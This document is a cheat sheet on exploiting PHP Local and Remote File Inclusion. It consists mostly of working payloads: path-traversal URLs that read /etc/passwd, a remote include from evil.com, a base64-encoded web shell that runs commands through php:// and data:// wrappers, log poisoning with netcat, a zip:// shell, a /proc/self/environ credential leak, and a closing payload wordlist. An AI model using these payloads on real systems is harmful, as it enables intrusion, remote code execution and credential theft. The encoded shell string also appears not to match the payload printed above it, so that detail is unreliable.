## Exploiting File Inclusion Vulnerabilities: LFI and RFI

### Table of Contents
1. [Local File Inclusion (LFI)](#1-local-file-inclusion-lfi)
2. [Remote File Inclusion (RFI)](#2-remote-file-inclusion-rfi)
3. [PHP Wrappers](#3-php-wrappers)
4. [Data Wrappers](#4-data-wrappers)
5. [PHP Session Files](#5-php-session-files)
6. [Log Poisoning](#6-log-poisoning)
7. [Additional Exploitation Methodologies](#7-additional-exploitation-methodologies)
   - [Null Byte Injection](#71-null-byte-injection)
   - [Path Traversal with Encoding](#72-path-traversal-with-encoding)
   - [Zip Wrapper for Code Execution](#73-zip-wrapper-for-code-execution)
   - [Proc Filesystem Exploitation](#74-proc-filesystem-exploitation)
8. [Wordlist](#Wordlist)

---

### 1. Local File Inclusion (LFI)
**Description**: LFI allows attackers to include files already present on the server by manipulating input parameters.

**Example**:
```php
<?php
  include($_GET['page']); // Vulnerable code
?>
```
**URL**:
```
http://example.com/index.php?page=about.php
```
**Attack**:
```
http://example.com/index.php?page=../../../../etc/passwd
```
This may expose sensitive files like `/etc/passwd` if input isn’t sanitized.

**Validation**: Correct. The example demonstrates a classic LFI vulnerability. Path traversal (`../`) is used to navigate the filesystem. However, modern systems may have protections like `open_basedir` or input validation, which can limit this attack.

---

### 2. Remote File Inclusion (RFI)
**Description**: RFI allows attackers to include remotely hosted files, potentially executing malicious code.

**Example**:
```php
<?php
  include($_GET['page']); // Vulnerable code
?>
```
**URL**:
```
http://example.com/index.php?page=http://evil.com/malicious.php
```
If `allow_url_include` is enabled in `php.ini`, the remote script executes on the server.

**Validation**: Accurate, but RFI is less common today because `allow_url_include` is disabled by default in PHP since version 5.2. Ensure the remote file has a `.php` extension or is executable, as servers may reject non-PHP files.

---

### 3. PHP Wrappers
**Description**: PHP wrappers (e.g., `php://filter`) allow access to data streams, enabling file reading or code execution.

**Example (File Reading)**:
```
php://filter/convert.base64-encode/resource=/etc/passwd
```
The server returns the base64-encoded content of `/etc/passwd`, which can be decoded.

**Example (Code Execution)**:
Payload:
```php
<?php system($_GET['cmd']); echo 'Shell done!'; ?>
```
Base64-encoded:
```
PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+
```
Full URL:
```
http://example.com/index.php?page=php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+&cmd=whoami
```
This decodes and executes the payload, running the `whoami` command.

**Validation**: Mostly correct. The `php://filter` wrapper is a powerful LFI technique. However, the `data://` wrapper is better categorized separately (see below). Also, `php://filter` requires precise syntax, and some servers may block `base64-decode` due to security filters.

PoC: [$4500 Local File Inclusion: The Tiny Parameter That Exposed an Entire Infrastructure](https://medium.com/@cyberknight/4500-local-file-inclusion-the-tiny-parameter-that-exposed-an-entire-infrastructure-74f7d3cc669c)
<br>
PoC: [From LFI to RCE via expect:// PHP Wrapper](https://medium.com/@zoningxtr/from-lfi-to-rce-via-expect-php-wrapper-a-deep-dive-with-practical-examples-699690073fe8)
<br>
PoC: [Advanced Local and Remote File Inclusion - PHP Wrappers](https://www.youtube.com/watch?v=cPSYuodIq9s)

---

### 4. Data Wrappers
**Description**: The `data://` wrapper embeds inline data, often for code execution.

**Example**:
```
data://text/plain,<?php%20phpinfo();%20?>
```
This executes `phpinfo()`, revealing server configuration.

**Validation**: Correct. The `data://` wrapper is effective for RFI when `allow_url_include` is enabled. Ensure URL-encoding (e.g., `%20` for spaces) is used correctly to avoid syntax errors.

---

### 5. PHP Session Files
**Description**: Attackers inject malicious code into session files, then use LFI to include and execute them.

**Exploitation**:
1. Inject PHP code (e.g., `<?php echo phpinfo(); ?>`) into a session variable via a parameter.
2. The code is stored in a session file (e.g., `/var/lib/php/sessions/sess_[sessionID]`).
3. Use LFI to include the session file:
```
http://example.com/index.php?page=/var/lib/php/sessions/sess_[sessionID]
```
Replace `[sessionID]` with the `PHPSESSID` cookie value.

**Validation**: Accurate. This technique requires control over session data and knowledge of the session file path. It’s effective but depends on predictable session storage and lax input validation.

---

### 6. Log Poisoning
**Description**: Attackers inject PHP code into server logs, then use LFI to include and execute the log file.

**Exploitation**:
1. Inject PHP code (e.g., `<?php echo phpinfo(); ?>`) into logs via:
   - User-Agent header
   - Malicious URL (e.g., `GET /<?php echo phpinfo(); ?>`)
   - Referrer header
2. Use Netcat to send the payload:
   ```
   nc 10.10.173.214 80
   GET /<?php echo phpinfo(); ?> HTTP/1.1
   Host: example.com
   ```
3. Include the log file via LFI:
   ```
   http://example.com/index.php?page=/var/log/apache2/access.log
   ```

**Validation**: Correct, but log poisoning requires write access to logs (e.g., via HTTP requests) and knowledge of the log file path. Modern servers may sanitize logs or restrict LFI to prevent this.

---

### 7. Additional Exploitation Methodologies

#### 7.1 Null Byte Injection
**Description**: Older PHP versions (<5.3) allowed null byte (`%00`) to truncate file paths, bypassing extension checks.

**Example**:
```
http://example.com/index.php?page=/etc/passwd%00
```
The `%00` null byte tricks the server into ignoring anything after it (e.g., `.php` suffix).

**Note**: This is obsolete in modern PHP due to stricter input handling but may work on legacy systems.

---

#### 7.2 Path Traversal with Encoding
**Description**: Attackers use encoded characters (e.g., URL, double URL, or UTF-8 encoding) to bypass filters.

**Example**:
```
http://example.com/index.php?page=%2e%2e%2f%2e%2e%2fetc%2fpasswd
```
`%2e%2e%2f` decodes to `../`, allowing directory traversal.

**Use Case**: Effective against weak input sanitization that fails to decode URLs before processing.

---

#### 7.3 Zip Wrapper for Code Execution
**Description**: The `zip://` wrapper allows including files within a zip archive, potentially executing code.

**Exploitation**:
1. Create a zip file (`malicious.zip`) containing a PHP file (e.g., `shell.php` with `<?php system($_GET['cmd']); ?>`).
2. Upload the zip file to the server (if possible) or host it remotely.
3. Use LFI to include:
   ```
   http://example.com/index.php?page=zip://malicious.zip#shell.php
   ```

**Note**: Requires `zip` extension enabled and a way to place the zip file on the server.

---

#### 7.4 Proc Filesystem Exploitation
**Description**: On Linux, the `/proc` filesystem contains runtime data that can be included via LFI to leak sensitive information.

**Example**:
```
http://example.com/index.php?page=/proc/self/environ
```
This may reveal environment variables, including database credentials or API keys.

**Use Case**: Useful for reconnaissance when direct file access is restricted.

---

### Wordlist

```
../../../../etc/passwd
../../../../etc/passwd%00
expect://id
file:///etc/passwd
php://filter/convert.base64-encode/resource=/etc/passwd
data://text/plain,<?php%20phpinfo();%20?>
```
